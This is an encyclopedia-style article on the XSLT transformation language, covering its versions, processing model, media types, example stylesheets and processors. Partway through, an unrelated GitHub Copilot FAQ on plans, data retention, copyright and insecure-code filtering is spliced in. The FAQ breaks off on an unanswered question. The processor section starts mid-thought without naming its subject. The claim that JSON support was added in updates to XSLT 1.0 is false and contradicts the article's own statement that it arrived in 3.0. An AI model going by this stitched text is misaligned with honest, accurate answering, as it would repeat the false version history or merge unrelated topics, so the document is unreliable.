**XSLT** (**Extensible Stylesheet Language Transformations**) is a language originally designed for [transforming](/wiki/XML_transformation_language "XML transformation language") [XML](/wiki/XML "XML") documents into other XML documents,[[1]](#cite_note-Transformation-1) or other formats such as [HTML](/wiki/HTML "HTML") for [web pages](/wiki/Web_page "Web page"), [plain text](/wiki/Plain_text "Plain text"), or [XSL Formatting Objects](/wiki/XSL_Formatting_Objects "XSL Formatting Objects"). These formats can be subsequently converted to formats such as [PDF](/wiki/Portable_Document_Format "Portable Document Format"), [PostScript](/wiki/PostScript "PostScript"), and [PNG](/wiki/Portable_Network_Graphics "Portable Network Graphics").[[2]](#cite_note-2) Support for JSON and plain-text transformation was added in later updates to the XSLT 1.0 specification.

As of August 2022[[update]](https://en.wikipedia.org/w/index.php?title=XSLT&action=edit), the most recent stable version of the language is XSLT 3.0, which achieved Recommendation status in June 2017.

XSLT 3.0 implementations support Java, .NET, C/C++, Python, PHP and NodeJS. An XSLT 3.0 JavaScript library can also be hosted within the web browser. Modern web browsers also include native support for XSLT 1.0.[[3]](#cite_note-Used_for-3)

The XSLT document transformation specifies how to transform an XML document into new document (usually XML, but other formats, such as plain text are supported).[[4]](#cite_note-4) Typically, input documents are XML files, but anything from which the processor can build an [XQuery and XPath Data Model](/wiki/XQuery_and_XPath_Data_Model "XQuery and XPath Data Model") can be used, such as [relational database](/wiki/Relational_database "Relational database") tables or [geographical information systems](/wiki/Geographical_information_systems "Geographical information systems").[[1]](#cite_note-Transformation-1)

While XSLT was originally designed as a special-purpose language for XML transformation, the language is [Turing-complete](/wiki/Turing_completeness "Turing completeness"), making it theoretically capable of arbitrary computations.[[5]](#cite_note-5)

## History

[[edit](/w/index.php?title=XSLT&action=edit&section=1 "Edit section: History")]

XSLT is influenced by [functional languages](/wiki/Functional_programming "Functional programming"),[[6]](#cite_note-6) and by text-based pattern matching languages like [SNOBOL](/wiki/SNOBOL "SNOBOL") and [AWK](/wiki/AWK "AWK"). Its most direct predecessor is [DSSSL](/wiki/DSSSL "DSSSL"), which did for [SGML](/wiki/SGML "SGML") what XSLT does for XML.[[7]](#cite_note-7)

* XSLT 1.0: XSLT was part of the [World Wide Web Consortium](/wiki/World_Wide_Web_Consortium "World Wide Web Consortium") (W3C)'s [eXtensible Stylesheet Language](/wiki/Extensible_Stylesheet_Language "Extensible Stylesheet Language") (XSL) development effort of 1998–1999, a project that also produced [XSL-FO](/wiki/XSL-FO "XSL-FO") and [XPath](/wiki/XPath "XPath"). Some members of the standards committee that developed XSLT, including [James Clark](/wiki/James_Clark_%28XML_expert%29 "James Clark (XML expert)"), the editor, had previously worked on DSSSL. XSLT 1.0 was published as a [W3C recommendation](/wiki/W3C_recommendation "W3C recommendation") in November 1999.[[8]](#cite_note-timelinehistory-8) Despite its age, XSLT 1.0[[9]](#cite_note-9) is still widely used (as of 2018[[update]](https://en.wikipedia.org/w/index.php?title=XSLT&action=edit)), since later versions are not supported natively in [web browsers](/wiki/Web_browser "Web browser") or for environments like [LAMP](/wiki/LAMP_%28software_bundle%29 "LAMP (software bundle)").

* XSLT 2.0: after an abortive attempt to create a version 1.1 in 2001,[[10]](#cite_note-10) the XSL working group joined forces with the [XQuery](/wiki/XQuery "XQuery") working group to create [XPath 2.0](/wiki/XPath_2.0 "XPath 2.0"),[[11]](#cite_note-11) with a richer data model and type system based on [XML Schema](/wiki/XML_Schema_%28W3C%29 "XML Schema (W3C)"). Building on this is XSLT 2.0,[[12]](#cite_note-12) developed under the editorship of [Michael Kay](/wiki/Michael_Howard_Kay "Michael Howard Kay"), which reached recommendation status in January 2007.[[13]](#cite_note-13) The most important innovations in XSLT 2.0 include:
  + String manipulation using [regular expressions](/wiki/Regular_expressions "Regular expressions")
  + Functions and operators for manipulating dates, times, and durations
  + Multiple output documents
  + Grouping (creating hierarchic structure from flat input sequences)
  + A richer type system and stronger type checking

* XSLT 3.0: became a W3C Recommendation on 8 June 2017. The main new features are:[[14]](#cite_note-new-in-3-14)
  + [Streaming transformations](/wiki/Streaming_XML "Streaming XML"): in previous versions the entire input document had to be read into memory before it could be processed,[[15]](#cite_note-15) and output could not be written until processing had finished. XSLT 3.0 allows [XML streaming](/wiki/Streaming_XML "Streaming XML") which is useful for processing documents too large to fit in memory or when transformations are chained in [XML Pipelines](/wiki/XML_Pipelines "XML Pipelines").
  + Packages, to improve the modularity of large stylesheets.
  + Improved handling of dynamic errors with, for example, an xsl:try instruction.
  + Support for maps and arrays, enabling XSLT to handle JSON as well as XML.
  + Functions can now be arguments to other (higher-order) functions.

## Design and processing model

[[edit](/w/index.php?title=XSLT&action=edit&section=2 "Edit section: Design and processing model")]
[![](//upload.wikimedia.org/wikipedia/commons/thumb/e/e6/XSLT_en.svg/220px-XSLT_en.svg.png)](/wiki/File%3AXSLT_en.svg)

Diagram of the basic elements and process flow of eXtensible Stylesheet Language Transformations.

The XSLT processor takes one or more XML source documents, plus one or more XSLT stylesheets, and processes them to produce one or multiple output documents.[[16]](#cite_note-16)[[17]](#cite_note-17) In contrast to widely implemented [imperative programming](/wiki/Imperative_programming "Imperative programming") languages like [C](/wiki/C_%28programming_language%29 "C (programming language)"), XSLT is [declarative](/wiki/Declarative_programming "Declarative programming").[[18]](#cite_note-18) The basic processing paradigm is pattern matching.[[19]](#cite_note-IBM-19) Rather than listing an imperative sequence of actions to perform in a stateful environment, template rules only define how to handle a node matching a particular XPath-like pattern, if the processor should happen to encounter one, and the contents of the templates effectively comprise [functional](/wiki/Functional_programming "Functional programming") [expressions](/wiki/Expression_%28programming%29 "Expression (programming)") that directly represent their evaluated form: the result tree, which is the basis of the processor's output.

A typical processor behaves as follows. First, assuming a stylesheet has already been read and prepared, the processor builds a source [tree](/wiki/Tree_data_structure "Tree data structure") from the input XML document. It then processes the source tree's root node, finds the best-matching template for that node in the stylesheet, and evaluates the template's contents. Instructions in each template generally direct the processor to either create nodes in the result tree, or to process more nodes in the source tree in the same way as the root node. Finally the result tree is serialized as XML or HTML text.

## XPath

[[edit](/w/index.php?title=XSLT&action=edit&section=3 "Edit section: XPath")]
Further information: [XPath](/wiki/XPath "XPath")

XSLT uses [XPath](/wiki/XPath "XPath") to identify subsets of the source document tree and perform calculations. XPath also provides a range of [functions](/wiki/Subroutine "Subroutine"), which XSLT itself further augments.

XSLT 1.0 uses XPath 1.0, while XSLT 2.0 uses XPath 2.0. XSLT 3.0 will work with either XPath 3.0 or 3.1. In the case of 1.0 and 2.0, the XSLT and XPath specifications were published on the same date. With 3.0, however, they were no longer synchronized; XPath 3.0 became a Recommendation in April 2014, followed by XPath 3.1 in February 2017; XSLT 3.0 followed in June 2017.

## XQuery compared

[[edit](/w/index.php?title=XSLT&action=edit&section=4 "Edit section: XQuery compared")]
Further information: [XQuery § XQuery and XSLT compared](/wiki/XQuery#XQuery_and_XSLT_compared "XQuery")

XSLT functionalities overlap with those of [XQuery](/wiki/XQuery "XQuery"), which was initially conceived as a query language for large collections of XML documents.

The XSLT 2.0 and XQuery 1.0 standards were developed by separate working groups within [W3C](/wiki/W3C "W3C"), working together to ensure a common approach where appropriate. They share the same data model, type system, and function library, and both include [XPath](/wiki/XPath "XPath") 2.0 as a sublanguage.

The two languages, however, are rooted in different traditions and serve the needs of different communities. XSLT was primarily conceived as a stylesheet language whose primary goal was to render XML for the human reader on screen, on [the web](/wiki/The_web "The web") (as a [web template language](/wiki/Web_template "Web template")), or on paper. XQuery was primarily conceived as a [database query language](/wiki/Database_query_language "Database query language") in the tradition of [SQL](/wiki/SQL "SQL").

Because the two languages originate in different communities, XSLT is stronger in its handling
of narrative documents with more flexible structure, while XQuery is stronger in its data handling, for example when performing relational joins.[[20]](#cite_note-20)

## Media types

[[edit](/w/index.php?title=XSLT&action=edit&section=5 "Edit section: Media types")]

The `<output>` element can optionally take the attribute `media-type`, which allows one to set the [media type](/wiki/Internet_media_type "Internet media type") (or MIME type) for the resulting output, for example: `<xsl:output output="xml" media-type="application/xml"/>`. The XSLT 1.0 recommendation recommends the more general attribute types `text/xml` and `application/xml` since for a long time there was no registered media type for XSLT. During this time `text/xsl` became the de facto standard. In XSLT 1.0 it was not specified how the `media-type` values should be used.

With the release of the XSLT 2.0, the W3C recommended in 2007 the registration of the MIME media type `application/xslt+xml`[[21]](#cite_note-21) and it was later registered with the [Internet Assigned Numbers Authority](/wiki/Internet_Assigned_Numbers_Authority "Internet Assigned Numbers Authority").[[22]](#cite_note-22)

Pre-1.0 working drafts of XSLT used `text/xsl` in their embedding examples, and this type was implemented and continued to be promoted by Microsoft in Internet Explorer[[23]](#cite_note-23) and MSXML circa 2012. It is also widely recognized in the `xml-stylesheet` processing instruction by other browsers. In practice, therefore, users wanting to control transformation in the browser using this processing instruction were obliged to use this unregistered media type.[[24]](#cite_note-24)

## Examples

[[edit](/w/index.php?title=XSLT&action=edit&section=6 "Edit section: Examples")]

These examples use the following incoming XML document:

```
<?xml version="1.0" ?>
<persons>
  <person username="JS1">
    <name>John</name>
    <family-name>Smith</family-name>
  </person>
  <person username="MI1">
    <name>Morka</name>
    <family-name>Ismincius</family-name>
  </person>
</persons>

```

### Example 1 (transforming XML to XML)

[[edit](/w/index.php?title=XSLT&action=edit&section=7 "Edit section: Example 1 (transforming XML to XML)")]

This XSLT stylesheet provides templates to transform the XML document:

```
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" version="1.0">
  <xsl:output method="xml" indent="yes"/>

  <xsl:template match="/persons">
    <root>
      <xsl:apply-templates select="person"/>
    </root>
  </xsl:template>

  <xsl:template match="person">
    <name username="{@username}">
      <xsl:value-of select="name" />
    </name>
  </xsl:template>

</xsl:stylesheet>

```

Its evaluation results in a new XML document, having another structure:

```
<?xml version="1.0" encoding="UTF-8"?>
<root>
  <name username="JS1">John</name>
  <name username="MI1">Morka</name>
</root>

```

### Example 2 (transforming XML to XHTML)

[[edit](/w/index.php?title=XSLT&action=edit&section=8 "Edit section: Example 2 (transforming XML to XHTML)")]

Processing the following example XSLT file

```
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet
  version="1.0"
  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns="http://www.w3.org/1999/xhtml">

  <xsl:output method="xml" indent="yes" encoding="UTF-8"/>

  <xsl:template match="/persons">
    <html>
      <head> <title>Testing XML Example</title> </head>
      <body>
        <h1>Persons</h1>
        <ul>
          <xsl:apply-templates select="person">
            <xsl:sort select="family-name" />
          </xsl:apply-templates>
        </ul>
      </body>
    </html>
  </xsl:template>

  <xsl:template match="person">
    <li>
      <xsl:value-of select="family-name"/><xsl:text>, </xsl:text><xsl:value-of select="name"/>
    </li>
  </xsl:template>

</xsl:stylesheet>

```

with the XML input file shown above results in the following [XHTML](/wiki/XHTML "XHTML") ([whitespace](/wiki/Whitespace_%28computer_science%29 "Whitespace (computer science)") has been adjusted here for clarity):

```
<?xml version="1.0" encoding="UTF-8"?>
<html xmlns="http://www.w3.org/1999/xhtml">
  <head> <title>Testing XML Example</title> </head>
  <body>
    <h1>Persons</h1>
      <ul>
        <li>Ismincius, Morka</li>
        <li>Smith, John</li>
      </ul>
  </body>
</html>

```

This XHTML generates the output below when rendered in a web browser.

[![](//upload.wikimedia.org/wikipedia/commons/c/c3/Xslt_ex2.png)](/wiki/File%3AXslt_ex2.png)

Rendered XHTML generated from an XML input file and an XSLT transformation.

In order for a web browser to be able to apply an XSL transformation to an XML document on display, an XML stylesheet processing instruction can be inserted into XML. So, for example, if the stylesheet in Example 2 above were available as "example2.xsl", the following instruction could be added to the original incoming XML:[[25]](#cite_note-w3cxslt-25)

```
<?xml-stylesheet href="example2.xsl" type="text/xsl" ?>

```

In this example, `text/xsl` is technically incorrect according to the W3C specifications[[25]](#cite_note-w3cxslt-25) (which say the type should be `application/xslt+xml`), but it is the only media type that is widely supported across browsers as of 2009, and the situation is unchanged in 2021.

## Processor implementations

It is based on [libxml](/wiki/Libxml "Libxml") and implemented in [C](/wiki/C_%28programming_language%29 "C (programming language)") for speed and portability. It supports XSLT 1.0 and [EXSLT](/wiki/EXSLT "EXSLT") extensions.[[26]](#cite_note-26)
  + It can be used at the command line via xsltproc[[27]](#cite_note-27) which is included in [macOS](/wiki/MacOS "MacOS")[[28]](#cite_note-28) and many [Linux distributions](/wiki/Linux_distributions "Linux distributions"), and can be used on [Windows](/wiki/Microsoft_Windows "Microsoft Windows") via [Cygwin](/wiki/Cygwin "Cygwin").[[29]](#cite_note-29)
  + The [WebKit](/wiki/WebKit "WebKit") and [Blink](/wiki/Blink_%28layout_engine%29 "Blink (layout engine)") layout engines, used for example in the [Safari](/wiki/Apple_Safari "Apple Safari") and [Chrome](/wiki/Google_Chrome "Google Chrome") web browsers respectively, uses the libxslt library to do XSL transformations.[[30]](#cite_note-30)
  + [Bindings](/wiki/Language_binding "Language binding") exist for [Python](/wiki/Python_%28programming_language%29 "Python (programming language)"),[[31]](#cite_note-31) [Perl](/wiki/Perl "Perl"),[[32]](#cite_note-32) [Ruby](/wiki/Ruby_%28programming_language%29 "Ruby (programming language)"),[[33]](#cite_note-33) [PHP](/wiki/PHP "PHP"),[[34]](#cite_note-34) [Common Lisp](/wiki/Common_Lisp "Common Lisp"),[[35]](#cite_note-35) [Tcl](/wiki/Tcl "Tcl"),[[36]](#cite_note-36) and [C++](/wiki/C%2B%2B "C++").[[37]](#cite_note-37)
* [Microsoft](/wiki/Microsoft "Microsoft") provides two XSLT processors (both XSLT 1.0 only). The earlier processor [MSXML](/wiki/MSXML "MSXML") provides COM interfaces; from MSXML 4.0 it also includes the command line utility `msxsl.exe`.[[38]](#cite_note-38) The .NET runtime includes a separate built-in XSLT processor in its `System.Xml.Xsl` library.
* [Saxon](/wiki/Saxon_XSLT "Saxon XSLT") is an XSLT 3.0 and XQuery 3.1 processor with [open-source](/wiki/Open-source_software "Open-source software") and [proprietary](/wiki/Proprietary_software "Proprietary software") versions for stand-alone operation and for [Java](/wiki/Java_%28programming_language%29 "Java (programming language)"), [JavaScript](/wiki/JavaScript "JavaScript") and .NET. A separate product Saxon-JS[[39]](#cite_note-39) offers XSLT 3.0 processing on [Node.js](/wiki/Node.js "Node.js") and in the browser.
* [xjslt](https://github.com/egh/xjslt) is an [open-source](/wiki/Open-source_software "Open-source software") XSLT 2.0 compiler for [JavaScript](/wiki/JavaScript "JavaScript") supporting [Node.js](/wiki/Node.js "Node.js") and the browser.

A variant of the Xalan processor is included as the default XSLT processor in the standard Java distribution from Oracle.
* Web browsers: Safari, Chrome, Firefox, Opera and Internet Explorer all support XSLT 1.0 (only).[[40]](#cite_note-40) Browsers can perform on-the-fly transformations of XML files and display the transformation output in the browser window. This is done either by embedding the XSL in the XML document or by referencing a file containing XSL instructions from the XML document. The latter may not work with Chrome on files from local filesystem because of its security model.[[41]](#cite_note-41)
* Adobe AXSLE engine, a proprietary library

### Performance

[[edit](/w/index.php?title=XSLT&action=edit&section=10 "Edit section: Performance")]

Most early XSLT processors were interpreters. More recently, code generation is increasingly common, using portable intermediate languages (such as [Java bytecode](/wiki/Java_bytecode "Java bytecode") or .NET [Common Intermediate Language](/wiki/Common_Intermediate_Language "Common Intermediate Language")) as the target. However, even the interpretive products generally offer separate analysis and execution phases, allowing an optimized expression tree to be created in memory and reused to perform multiple transformations. This gives substantial performance benefits in online publishing applications, where the same transformation is applied many times per second to different source documents.[[42]](#cite_note-42) This separation is reflected in the design of XSLT processing APIs (such as [JAXP](/wiki/Java_API_for_XML_Processing "Java API for XML Processing")).

Early XSLT processors had very few optimizations. Stylesheet documents were read into [Document Object Models](/wiki/Document_Object_Model "Document Object Model") and the processor would act on them directly. [XPath](/wiki/XPath "XPath") engines were also not optimized. Increasingly, however, XSLT processors use optimization techniques found in functional programming languages and database query languages, such as static rewriting of an expression tree (e.g., to move calculations out of loops), and lazy pipelined evaluation to reduce the [memory footprint](/wiki/Memory_footprint "Memory footprint") of intermediate results (and allow "early exit" when the processor can evaluate an expression such as `following-sibling::*[1]` without a complete evaluation of all subexpressions). Many processors also use tree representations that are significantly more efficient (in both space and time)[[43]](#cite_note-43) than general-purpose DOM implementations.

In June 2014, Debbie Lockett and [Michael Kay](/wiki/Michael_Howard_Kay "Michael Howard Kay") introduced an open-source benchmarking framework for XSLT processors called XT-Speedo.[[44]](#cite_note-44)

### Frequently asked questions

#### General

#### What is GitHub Copilot?

GitHub Copilot transforms the developer experience. Backed by the leaders in AI, Copilot provides contextualized assistance throughout the software development lifecycle, from code completions and chat assistance in the IDE to code explanations and answers to docs in GitHub and more. With Copilot elevating their workflow, developers can focus on more: value, innovation, and happiness.

GitHub Copilot enables developers to focus more energy on problem solving and collaboration and spend less effort on the mundane and boilerplate. That’s why developers who use Copilot report up to 75% higher satisfaction with their jobs than those who don’t and are up to 55% more productive at writing code without sacrifice to quality, which all adds up to engaged developers shipping great software faster.

GitHub Copilot integrates with leading editors, including Visual Studio Code, Visual Studio, JetBrains IDEs, and Neovim, and, unlike other AI coding assistants, is natively built into GitHub. Growing to millions of individual users and tens of thousands of business customers, Copilot is the world’s most widely adopted AI developer tool and the competitive advantage developers ask for by name.

#### Who is eligible to access GitHub Copilot for free?

GitHub Copilot Free is a new free pricing tier with limited functionality for individual developers. Users assigned a Copilot Business or Copilot Enterprise seat are not eligible for access. Users with access to Copilot Pro through a paid subscription, trial, or through an existing verified OSS, Student, Faculty, or MVP account may elect to use Free instead.

#### What languages, IDEs, and platforms does GitHub Copilot support?

GitHub Copilot is trained on all languages that appear in public repositories. For each language, the quality of suggestions you receive may depend on the volume and diversity of training data for that language. For example, JavaScript is well-represented in public repositories and is one of GitHub Copilot’s best supported languages. Languages with less representation in public repositories may produce fewer or less robust suggestions.

GitHub Copilot is available as an extension in Visual Studio Code, Visual Studio, Vim, Neovim, the JetBrains suite of IDEs, and Azure Data Studio. Although code completion functionality is available across all these extensions, chat functionality is currently available only in Visual Studio Code, JetBrains and Visual Studio. GitHub Copilot is also supported in terminals through GitHub CLI and as a chat integration in Windows Terminal Canary. With the GitHub Copilot Enterprise plan, GitHub Copilot is natively integrated into GitHub.com. All plans are supported in GitHub Copilot in GitHub Mobile. GitHub Mobile for Copilot Pro and Copilot Business have access to Bing and public repository code search. Copilot Enterprise in GitHub Mobile gives you additional access to your organization's knowledge.

#### Does GitHub Copilot “copy/paste”?

No, GitHub Copilot generates suggestions using probabilistic determination.

* When thinking about intellectual property and open source issues, it is critical to understand how GitHub Copilot really works. The AI models that create Copilot’s suggestions may be trained on public code, but do not contain any code. When they generate a suggestion, they are not “copying and pasting” from any codebase.
* To generate a code suggestion, the Copilot extension begins by examining the code in your editor—focusing on the lines just before and after your cursor, but also information including other files open in your editor and the URLs of repositories or file paths to identify relevant context. That information is sent to Copilot’s model, to make a probabilistic determination of what is likely to come next and generate suggestions.
* To generate a suggestion for chat in the code editor, the Copilot extension creates a contextual prompt by combining your prompt with additional context including the code file open in your active document, your code selection, and general workspace information, such as frameworks, languages, and dependencies. That information is sent to Copilot’s model, to make a probabilistic determination of what is likely to come next and generate suggestions.
* To generate a suggestion for chat on GitHub.com, such as providing an answer to a question from your chat prompt, Copilot creates a contextual prompt by combining your prompt with additional context including previous prompts, the open pages on GitHub.com as well as retrieved context from your codebase or Bing search. That information is sent to Copilot’s model, to make a probabilistic determination of what is likely to come next and generate suggestions.

#### What are the differences between the GitHub Copilot Business, GitHub Copilot Enterprise, and GitHub Copilot Individual plans?

GitHub Copilot has multiple offerings for organizations and an offering for individual developers. All the offerings include both code completion and chat assistance. The primary differences between the organization offerings and the individual offering are license management, policy management, and IP indemnity.

Organizations can choose between GitHub Copilot Business and GitHub Copilot Enterprise. GitHub Copilot Business primarily features GitHub Copilot in the coding environment - that is the IDE, CLI and GitHub Mobile. GitHub Copilot Enterprise includes everything in GitHub Copilot Business. It also  adds an additional layer of customization for organizations and integrates into GitHub.com as a chat interface to allow developers to converse with Copilot  throughout the platform. GitHub Copilot Enterprise can index an organization’s codebase for a deeper understanding of the customer’s knowledge for more tailored suggestions and will offer customers access to fine-tuned custom, private models for code completion.

#### Privacy

#### What personal data does GitHub Copilot process?

GitHub Copilot processes personal data based on how Copilot is accessed and used: whether via GitHub.com, mobile app, extensions, or one of various IDE extensions, or through features like suggestions for the command line interface (CLI), IDE code completions, or personalized chat on GitHub.com. The types of personal data processed may include:

* **User Engagement Data:** This includes pseudonymous identifiers captured on user interactions with Copilot, such as accepted or dismissed completions, error messages, system logs, and product usage metrics.
* **Prompts:** These are inputs for chat or code, along with context, sent to Copilot's AI to generate suggestions.
* **Suggestions:** These are the AI-generated code lines or chat responses provided to users based on their prompts.
* **Feedback Data:** This comprises real-time user feedback, including reactions (e.g., thumbs up/down) and optional comments, along with feedback from support tickets.

#### Does GitHub use Copilot Business or Enterprise data to train GitHub’s model?

No. GitHub does not use either Copilot Business or Enterprise data to train its models.

#### How does GitHub use the Copilot data?

How GitHub uses Copilot data depends on how the user accesses Copilot and for what purpose. Users can access GitHub Copilot through the web, extensions, mobile apps, computer terminal, and various IDEs (Integrated Development Environments). GitHub generally uses personal data to:

* Deliver, maintain, and update the services as per the customer's configuration and usage, to ensure personalized experiences and recommendations
* Troubleshoot, which involves preventing, detecting, resolving, and mitigating issues, including security incidents and product-related problems, by fixing software bugs and maintaining the online services' functionality and up-to-dateness
* Enhance user productivity, reliability, effectiveness, quality, privacy, accessibility, and security by keeping the service current and operational

These practices are outlined in GitHub’s Data Protection Agreement ([DPA)](https://github.com/customer-terms/github-data-protection-agreement), which details our data handling commitments to our data controller customers.

GitHub also uses certain personal data with customer authorization under the DPA, for the following purposes:

* Billing and account management
* To comply with and resolve legal obligations
* For abuse detection, prevention, and protection, virus scanning, and scanning to detect violations of terms of service
* To generate summary reports for calculating employee commissions and partner incentives
* To produce aggregated reports for internal use and strategic planning, covering areas like forecasting, revenue analysis, capacity planning, and product strategy,

For details on GitHub's data processing activities as a controller, particularly for Copilot Pro customers, refer to the [GitHub Privacy Statement](https://docs.github.com/en/site-policy/privacy-policies/github-general-privacy-statement).

#### How long does GitHub retain Copilot data for Business and Enterprise customers?

If and for how long GitHub’s retains Copilot data depends on how a Copilot user accesses Copilot and for what purpose. The default settings for Copilot Business and Enterprise Customers are as follows:

**Access through IDE for Chat and Code Completions:**

* Prompts and Suggestions: Not retained
* User Engagement Data: Kept for two years.
* Feedback Data: Stored for as long as needed for its intended purpose.

**All other GitHub Copilot access and use:**

* Prompts and Suggestions: Retained for 28 days.
* User Engagement Data: Kept for two years.
* Feedback Data: Stored for as long as needed for its intended purpose.

#### Why do some Copilot features retain prompts and suggestions?

Retaining prompts and suggestions is necessary for chat on github.com, mobile, and CLI Copilot because those features’ effectiveness depends on using thread history to improve responses. The Copilot model requires access to previous interactions to deliver accurate and relevant suggestions.

#### Does GitHub Copilot support compliance with the GDPR and other data protection laws?

Yes. GitHub and customers can enter a [Data Protection Agreement](https://github.com/customer-terms/github-data-protection-agreement) that supports compliance with the GDPR and similar legislation.

#### Does GitHub Copilot ever output personal data?

While we've designed GitHub Copilot with privacy in mind, the expansive definition of personal data under legislation like the EU’s General Data Protection Regulation (GDPR) means we can't guarantee it will never output such data. The Large Language Model (LLM) powering GitHub Copilot was trained on public code and there were instances in our tests where the tool made suggestions resembling personal data. These suggestions were typically synthesized and not tied to real individuals.

#### How does Copilot allow users to access, alter or delete personal data?

These actions are available to Copilot users as described in the [GitHub Privacy Statement](https://docs.github.com/en/site-policy/privacy-policies/github-general-privacy-statement#your-privacy-rights).

#### Responsible AI

#### What are the intellectual property considerations when using GitHub Copilot?

The primary IP considerations for GitHub Copilot relate to copyright. The model that powers Copilot is trained on a broad collection of publicly accessible code, which may include copyrighted code, and Copilot’s suggestions (in rare instances) may resemble the code its model was trained on. Here’s some basic information you should know about these considerations:

Copyright law permits the use of copyrighted works to train AI models:  Countries around the world have provisions in their copyright laws that enable machines to learn, understand, extract patterns, and facts from copyrighted materials, including software code. For example, the European Union, Japan, and Singapore, have express provisions permitting machine learning to develop AI models. Other countries including Canada, India, and the United States also permit such training under their fair use/fair dealing provisions. GitHub Copilot’s AI model was trained with the use of code from GitHub’s public repositories—which are publicly accessible and within the scope of permissible copyright use.

What about copyright risk in suggestions? In rare instances (less than 1% based on GitHub’s research), suggestions from GitHub may match examples of code used to train GitHub’s AI model. Again, Copilot does not “look up” or “copy and paste” code, but is instead using context from a user’s workspace to synthesize and generate a suggestion.

Our experience shows that matching suggestions are most likely to occur in two situations: (i) when there is little or no context in the code editor for Copilot’s model to synthesize, or (ii) when a matching suggestion represents a common approach or method. If a code suggestion matches existing code, there is risk that using that suggestion could trigger claims of copyright infringement, which would depend on the amount and nature of code used, and the context of how the code is used. In many ways, this is the same risk that arises when using any code that a developer does not originate, such as copying code from an online source, or reusing code from a library. That is why responsible organizations and developers recommend that users employ code scanning policies to identify and evaluate potential matching code.

In Copilot, you can opt whether to allow Copilot to suggest code completions that match publicly available code on GitHub.com. For more information, see "[Configuring GitHub Copilot settings on GitHub.com](https://docs-internal-46619-d1aa34.preview.ghdocs.com/en/copilot/configuring-github-copilot/configuring-github-copilot-settings-on-githubcom#enabling-or-disabling-duplication-detection)". If you have allowed suggestions that match public code, GitHub Copilot can provide you with details about the matching code when you accept such suggestions. Matching code does not necessarily mean copyright infringement, so it is ultimately up to the user to determine whether to use the suggestion, and what and who to attribute (along with other license compliance) in appropriate circumstances.

#### Does GitHub Copilot include a filtering mechanism to mitigate risk?

Yes, GitHub Copilot does include an optional code referencing filter to detect and suppress certain suggestions that match public code on GitHub.

* GitHub has created a duplication detection filter to detect and suppress suggestions that contain code segments over a certain length that match public code on GitHub. This filter can be enabled by the administrator for your enterprise and it can apply for all organizations within your enterprise, or the administrator can defer control to individual organizations.
* With the filter enabled, Copilot checks code suggestions for matches or near-matches against public code on GitHub of 65 lexemes or more (on average,150 characters). If there is a match, the suggestion will not be shown to the user.
* In addition to off-topic, harmful, and offensive output filters, GitHub Copilot also scans the outputs for vulnerable code.

#### Does GitHub Copilot include features to make it easier for users to identify potentially relevant open source licenses for matching suggestions?

Yes, GitHub Copilot is previewing a [code referencing feature](https://github.blog/2023-08-03-introducing-code-referencing-for-github-copilot/) as an additional tool to assist users to find and review potentially relevant open source licenses. Code referencing is currently available in Visual Studio Code. This feature searches across public GitHub repositories for code that matches a Copilot suggestion. If there’s a match, users will find its information displayed in the Copilot console log, including where the match occurred, any applicable licenses, and a deep link to learn more. The deep link will take users to a navigable page on GitHub.com to browse examples of the code match and their repository licenses, and see how many repositories—including ones without licenses—that code appears in, as well as links to those repositories. Copilot users can review this information to determine whether the applicable suggestions are suitable for use, and whether additional measures may be necessary to use them.

#### Who owns the suggestions provided by GitHub Copilot?

We don’t determine whether a suggestion is capable of being owned, but we are clear that GitHub does not claim ownership of a suggestion. Whether a suggestion generated by an AI model can be owned depends on many factors (e.g. the intellectual property law in the relevant country, the length of the suggestion, the extent that suggestion is considered ‘functional’ instead of expressive, etc).

* If a suggestion is capable of being owned, our terms are clear: GitHub does not claim ownership.
* GitHub does not claim ownership of any suggestion. In certain cases, it is possible for Copilot to produce similar suggestions to different users. For example, two unrelated users both starting new files to code the quicksort algorithm in Java will likely get the same suggestion. The possibility of providing similar suggestions to multiple users is a common part of generative AI systems.

#### Can GitHub Copilot introduce insecure code in its suggestions?

Public code may contain insecure coding patterns, bugs, or references to outdated APIs or idioms. When GitHub Copilot synthesizes code suggestions based on this data, it can also synthesize code that contains these undesirable patterns. Copilot has filters in place that either block or notify users of insecure code patterns that are detected in Copilot suggestions. These filters target the most common vulnerable coding patterns, including [hardcoded credentials](https://cwe.mitre.org/data/definitions/798.html), [SQL injections](https://cwe.mitre.org/data/definitions/89.html), and [path injections](https://cwe.mitre.org/data/definitions/22.html). Additionally, in recent years we’ve provided tools such as GitHub Advanced Security, GitHub Actions, Dependabot, and CodeQL to open source projects to help improve code quality. Of course, you should always use GitHub Copilot together with good testing and code review practices and security tools, as well as your own judgment.

#### Is GitHub Copilot intended to fully automate code generation and replace developers?

No. Copilot is a tool intended to make developers more efficient. It’s not intended to replace developers, who should continue to apply the same sorts of safeguards and diligence they would apply with regard to any third-party code of unknown origin.

* The product is called “Copilot” not “Autopilot” and it’s not intended to generate code without oversight. You should use exactly the same sorts of safeguards and diligence with Copilot’s suggestions as you would use with any third-party code.
* Identifying best practices for use of third party code is beyond the scope of this section. That said, whatever practices your organization currently uses – rigorous functionality testing, code scanning, security testing, etc. – you should continue these policies with Copilot’s suggestions. Moreover, you should make sure your code editor or editor does not automatically compile or run generated code before you review it.

#### Can GitHub Copilot users simply use suggestions without concern?

Not necessarily. GitHub Copilot users should align their use of Copilot with their respective risk tolerances.

* As noted above, GitHub Copilot is not intended to replace developers, or their individual skill and judgment, and is not intended to fully automate the process of code development. The same risks that apply to the use of any third-party code apply to the use of Copilot’s suggestions.
* Depending on your particular use case, you should consider implementing the protections discussed above. It is your responsibility to assess what is appropriate for the situation and implement appropriate safeguards.
* You’re entitled to IP indemnification from GitHub for the unmodified suggestions when Copilot’s filtering is enabled. If you do elect to enable this feature, the copyright responsibility is ours, not our customers. As part of our ongoing commitment to responsible AI, GitHub and Microsoft extends our IP indemnity and protection support to our customers who are empowering their teams with GitHub Copilot. See [Microsoft's Copilot Copyright Commitment](https://blogs.microsoft.com/on-the-issues/2023/09/07/copilot-copyright-commitment-ai-legal-concerns/) for more details.

#### Does GitHub Copilot support accessibility features?

We are conducting internal testing of GitHub Copilot’s ease of use by developers with disabilities and working to ensure that GitHub Copilot is accessible to all developers. Please feel free to share your feedback on GitHub Copilot accessibility in our [feedback forum](https://github.com/github-community/community/discussions/categories/copilot).

#### Does GitHub Copilot produce offensive outputs?

